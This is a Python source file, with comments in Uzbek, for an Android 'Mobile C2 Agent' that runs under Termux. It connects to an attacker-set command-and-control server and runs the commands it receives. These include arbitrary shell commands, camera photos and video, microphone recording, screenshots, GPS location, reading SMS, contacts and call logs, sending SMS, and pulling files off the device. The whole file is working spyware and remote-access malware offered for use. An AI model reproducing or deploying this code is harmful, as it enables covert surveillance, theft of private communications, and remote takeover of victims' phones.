"""
Android Mobile Agent - Telefon uchun C2 Agent
Barcha funksiyalar: Camera, Audio, Screenshot, GPS, SMS, Contacts, Files
"""

import socket
import json
import threading
import time
import os
import sys
import base64
from datetime import datetime


class MobileAgent:
    """Android telefon uchun C2 agent"""
    
    def __init__(self, server_host, server_port):
        self.host = server_host
        self.port = server_port
        self.socket = None
        self.running = False
        
        # Device info
        self.device_info = self.get_device_info()
        
    def get_device_info(self):
        """Telefon haqida ma'lumot"""
        try:
            import platform
            
            info = {
                'type': 'ANDROID',
                'platform': platform.system(),
                'hostname': socket.gethostname(),
                'python_version': sys.version,
                'capabilities': [
                    'camera',
                    'microphone', 
                    'screenshot',
                    'gps',
                    'sms',
                    'contacts',
                    'files',
                    'shell'
                ]
            }
            
            # Try to get Android-specific info
            try:
                # Check if running on Android (Termux)
                if os.path.exists('/data/data/com.termux'):
                    info['type'] = 'ANDROID_TERMUX'
                    
                # Try to get Android version
                try:
                    result = os.popen('getprop ro.build.version.release').read().strip()
                    info['android_version'] = result
                except:
                    pass
                    
                # Device model
                try:
                    model = os.popen('getprop ro.product.model').read().strip()
                    info['device_model'] = model
                except:
                    pass
                    
            except:
                pass
                
            return info
            
        except Exception as e:
            return {
                'type': 'MOBILE',
                'error': str(e)
            }
    
    def connect(self):
        """Serverga ulanish"""
        try:
            self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.socket.connect((self.host, self.port))
            
            # Send device info
            self.send_data({
                'type': 'DEVICE_INFO',
                'data': self.device_info
            })
            
            print(f"[+] Connected to C2 Server: {self.host}:{self.port}")
            self.running = True
            return True
            
        except Exception as e:
            print(f"[-] Connection failed: {e}")
            return False
    
    def send_data(self, data):
        """Ma'lumot yuborish"""
        try:
            json_data = json.dumps(data)
            self.socket.send(json_data.encode() + b'\n')
            return True
        except Exception as e:
            print(f"[-] Send error: {e}")
            return False
    
    def receive_command(self):
        """Komanda qabul qilish"""
        try:
            data = self.socket.recv(4096).decode()
            if data:
                return json.loads(data)
            return None
        except Exception as e:
            print(f"[-] Receive error: {e}")
            return None
    
    def execute_command(self, command_data):
        """Komandani bajarish"""
        try:
            cmd_type = command_data.get('type')
            
            if cmd_type == 'SHELL':
                return self.execute_shell(command_data.get('command'))
                
            elif cmd_type == 'SCREENSHOT':
                return self.take_screenshot()
                
            elif cmd_type == 'CAMERA_PHOTO':
                return self.take_photo(command_data.get('camera', 'back'))
                
            elif cmd_type == 'CAMERA_VIDEO':
                return self.record_video(command_data.get('duration', 10))
                
            elif cmd_type == 'RECORD_AUDIO':
                return self.record_audio(command_data.get('duration', 10))
                
            elif cmd_type == 'GET_GPS':
                return self.get_gps_location()
                
            elif cmd_type == 'GET_SMS':
                return self.get_sms_messages()
                
            elif cmd_type == 'SEND_SMS':
                return self.send_sms(
                    command_data.get('number'),
                    command_data.get('message')
                )
                
            elif cmd_type == 'GET_CONTACTS':
                return self.get_contacts()
                
            elif cmd_type == 'GET_CALL_LOG':
                return self.get_call_log()
                
            elif cmd_type == 'LIST_FILES':
                return self.list_files(command_data.get('path', '/sdcard'))
                
            elif cmd_type == 'DOWNLOAD_FILE':
                return self.download_file(command_data.get('filepath'))
                
            elif cmd_type == 'UPLOAD_FILE':
                return self.upload_file(
                    command_data.get('filepath'),
                    command_data.get('content')
                )
                
            elif cmd_type == 'GET_DEVICE_INFO':
                return {'status': 'success', 'data': self.device_info}
                
            elif cmd_type == 'VIBRATE':
                return self.vibrate(command_data.get('duration', 500))
                
            else:
                return {'status': 'error', 'message': f'Unknown command: {cmd_type}'}
                
        except Exception as e:
            return {'status': 'error', 'message': str(e)}
    
    def execute_shell(self, command):
        """Shell komanda bajarish"""
        try:
            import subprocess
            result = subprocess.check_output(
                command,
                shell=True,
                stderr=subprocess.STDOUT,
                timeout=30
            ).decode()
            
            return {'status': 'success', 'output': result}
            
        except Exception as e:
            return {'status': 'error', 'message': str(e)}
    
    def take_screenshot(self):
        """Screenshot olish (Android)"""
        try:
            # Use screencap command (requires Termux:API)
            timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
            filepath = f'/sdcard/screenshot_{timestamp}.png'
            
            # Try screencap command
            os.system(f'screencap -p {filepath}')
            
            # Check if file exists
            if os.path.exists(filepath):
                # Read and encode
                with open(filepath, 'rb') as f:
                    image_data = base64.b64encode(f.read()).decode()
                
                # Clean up
                os.remove(filepath)
                
                return {
                    'status': 'success',
                    'image': image_data,
                    'format': 'png'
                }
            else:
                return {
                    'status': 'error',
                    'message': 'Screenshot failed - Install Termux:API'
                }
                
        except Exception as e:
            return {'status': 'error', 'message': str(e)}
    
    def take_photo(self, camera='back'):
        """Kamera orqali rasm olish"""
        try:
            # Requires Termux:API
            timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
            filepath = f'/sdcard/photo_{timestamp}.jpg'
            
            # Use termux-camera-photo command
            camera_id = '0' if camera == 'back' else '1'
            os.system(f'termux-camera-photo -c {camera_id} {filepath}')
            
            time.sleep(2)  # Wait for capture
            
            if os.path.exists(filepath):
                with open(filepath, 'rb') as f:
                    image_data = base64.b64encode(f.read()).decode()
                
                os.remove(filepath)
                
                return {
                    'status': 'success',
                    'image': image_data,
                    'camera': camera,
                    'format': 'jpg'
                }
            else:
                return {
                    'status': 'error',
                    'message': 'Camera capture failed - Install Termux:API'
                }
                
        except Exception as e:
            return {'status': 'error', 'message': str(e)}
    
    def record_video(self, duration=10):
        """Video yozish"""
        try:
            timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
            filepath = f'/sdcard/video_{timestamp}.mp4'
            
            # termux-camera-video
            os.system(f'timeout {duration}s termux-camera-video {filepath}')
            
            time.sleep(duration + 1)
            
            if os.path.exists(filepath):
                # Get file size
                size = os.path.getsize(filepath)
                
                return {
                    'status': 'success',
                    'filepath': filepath,
                    'size': size,
                    'duration': duration,
                    'message': f'Video saved: {filepath}'
                }
            else:
                return {'status': 'error', 'message': 'Video recording failed'}
                
        except Exception as e:
            return {'status': 'error', 'message': str(e)}
    
    def record_audio(self, duration=10):
        """Audio yozish"""
        try:
            timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
            filepath = f'/sdcard/audio_{timestamp}.wav'
            
            # termux-microphone-record
            os.system(f'timeout {duration}s termux-microphone-record -f {filepath}')
            
            time.sleep(duration + 1)
            
            if os.path.exists(filepath):
                with open(filepath, 'rb') as f:
                    audio_data = base64.b64encode(f.read()).decode()
                
                os.remove(filepath)
                
                return {
                    'status': 'success',
                    'audio': audio_data,
                    'duration': duration,
                    'format': 'wav'
                }
            else:
                return {'status': 'error', 'message': 'Audio recording failed'}
                
        except Exception as e:
            return {'status': 'error', 'message': str(e)}
    
    def get_gps_location(self):
        """GPS joylashuv"""
        try:
            # termux-location
            import subprocess
            result = subprocess.check_output(
                'termux-location -p network',
                shell=True,
                timeout=10
            ).decode()
            
            location = json.loads(result)
            
            return {
                'status': 'success',
                'location': location,
                'latitude': location.get('latitude'),
                'longitude': location.get('longitude'),
                'accuracy': location.get('accuracy'),
                'provider': location.get('provider')
            }
            
        except Exception as e:
            return {'status': 'error', 'message': str(e)}
    
    def get_sms_messages(self):
        """SMS xabarlar"""
        try:
            import subprocess
            result = subprocess.check_output(
                'termux-sms-list',
                shell=True,
                timeout=10
            ).decode()
            
            messages = json.loads(result)
            
            return {
                'status': 'success',
                'messages': messages,
                'count': len(messages)
            }
            
        except Exception as e:
            return {'status': 'error', 'message': str(e)}
    
    def send_sms(self, number, message):
        """SMS yuborish"""
        try:
            os.system(f'termux-sms-send -n {number} "{message}"')
            
            return {
                'status': 'success',
                'message': f'SMS sent to {number}'
            }
            
        except Exception as e:
            return {'status': 'error', 'message': str(e)}
    
    def get_contacts(self):
        """Kontaktlar"""
        try:
            import subprocess
            result = subprocess.check_output(
                'termux-contact-list',
                shell=True,
                timeout=10
            ).decode()
            
            contacts = json.loads(result)
            
            return {
                'status': 'success',
                'contacts': contacts,
                'count': len(contacts)
            }
            
        except Exception as e:
            return {'status': 'error', 'message': str(e)}
    
    def get_call_log(self):
        """Qo'ng'iroq tarixi"""
        try:
            import subprocess
            result = subprocess.check_output(
                'termux-call-log',
                shell=True,
                timeout=10
            ).decode()
            
            call_log = json.loads(result)
            
            return {
                'status': 'success',
                'call_log': call_log,
                'count': len(call_log)
            }
            
        except Exception as e:
            return {'status': 'error', 'message': str(e)}
    
    def list_files(self, path):
        """Fayllar ro'yxati"""
        try:
            files = []
            for item in os.listdir(path):
                full_path = os.path.join(path, item)
                is_dir = os.path.isdir(full_path)
                
                try:
                    size = os.path.getsize(full_path) if not is_dir else 0
                except:
                    size = 0
                
                files.append({
                    'name': item,
                    'path': full_path,
                    'is_directory': is_dir,
                    'size': size
                })
            
            return {
                'status': 'success',
                'files': files,
                'path': path
            }
            
        except Exception as e:
            return {'status': 'error', 'message': str(e)}
    
    def download_file(self, filepath):
        """Fayl yuklash (C2 serverga)"""
        try:
            with open(filepath, 'rb') as f:
                file_data = base64.b64encode(f.read()).decode()
            
            return {
                'status': 'success',
                'file_data': file_data,
                'filename': os.path.basename(filepath),
                'size': os.path.getsize(filepath)
            }
            
        except Exception as e:
            return {'status': 'error', 'message': str(e)}
    
    def upload_file(self, filepath, content):
        """Fayl yuklash (serverdan telefonga)"""
        try:
            # Decode base64
            file_data = base64.b64decode(content)
            
            # Write file
            with open(filepath, 'wb') as f:
                f.write(file_data)
            
            return {
                'status': 'success',
                'filepath': filepath,
                'size': len(file_data)
            }
            
        except Exception as e:
            return {'status': 'error', 'message': str(e)}
    
    def vibrate(self, duration=500):
        """Telefon vibratsiyasi"""
        try:
            os.system(f'termux-vibrate -d {duration}')
            
            return {
                'status': 'success',
                'message': f'Vibrated for {duration}ms'
            }
            
        except Exception as e:
            return {'status': 'error', 'message': str(e)}
    
    def run(self):
        """Agent ishga tushirish"""
        while self.running:
            try:
                command = self.receive_command()
                
                if command:
                    print(f"[>] Command: {command.get('type')}")
                    
                    # Execute command
                    result = self.execute_command(command)
                    
                    # Send result
                    self.send_data({
                        'type': 'COMMAND_RESULT',
                        'command_type': command.get('type'),
                        'result': result
                    })
                    
                time.sleep(0.1)
                
            except KeyboardInterrupt:
                print("\n[!] Shutting down...")
                break
                
            except Exception as e:
                print(f"[-] Error: {e}")
                time.sleep(1)
        
        self.disconnect()
    
    def disconnect(self):
        """Ulanishni uzish"""
        try:
            if self.socket:
                self.socket.close()
            print("[+] Disconnected")
        except:
            pass


def main():
    """Main entry point"""
    print("="*50)
    print("🤖 Mobile C2 Agent - Android")
    print("="*50)
    
    # Configuration
    SERVER_HOST = "YOUR_C2_SERVER_IP"  # C2 server IP manzili
    SERVER_PORT = 9999
    
    # Create agent
    agent = MobileAgent(SERVER_HOST, SERVER_PORT)
    
    # Connect and run
    if agent.connect():
        print("[+] Agent running...")
        agent.run()
    else:
        print("[-] Failed to connect to C2 server")


if __name__ == "__main__":
    main()
